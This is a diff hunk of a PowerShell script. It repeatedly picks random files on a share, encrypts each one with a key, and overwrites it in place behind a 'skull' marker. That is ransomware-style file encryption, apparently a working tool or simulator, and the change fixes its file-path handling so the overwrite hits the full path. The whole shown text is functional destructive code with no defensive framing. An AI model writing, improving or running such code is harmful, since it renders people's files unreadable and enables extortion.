@@ -5,14 +5,14 @@
     $semaphore = "skull"
 	While($true)
 	{
-		$files = Get-ChildItem -Path $Share -Recurse;
+		$files = Get-ChildItem -Path $Share -Recurse | Select-Object FullName;
 		if ($files.length -gt 0) {
             $sample = $files | Get-Random -Count 1;
             $plain = [System.Text.Encoding]::ASCII.GetString((Get-Content -Encoding byte -TotalCount 60000 "${Share}\${sample}"));
             if ($plain.Substring(0,$semaphore.length) -ne $semaphore) {
                 $encrypt = ConvertFrom-SecureString -SecureString (ConvertTo-SecureString $plain -AsPlainText -Force) -Key $key
-                Set-Content -Path "${Share}\${sample}" -value "${semaphore}${encrypt}";
-			    Write-Host "${Share}\${sample}";
+                Set-Content -Path $sample -value "${semaphore}${encrypt}";
+			    Write-Host $sample;
             }
 		}
 		Start-Sleep $Sleep;
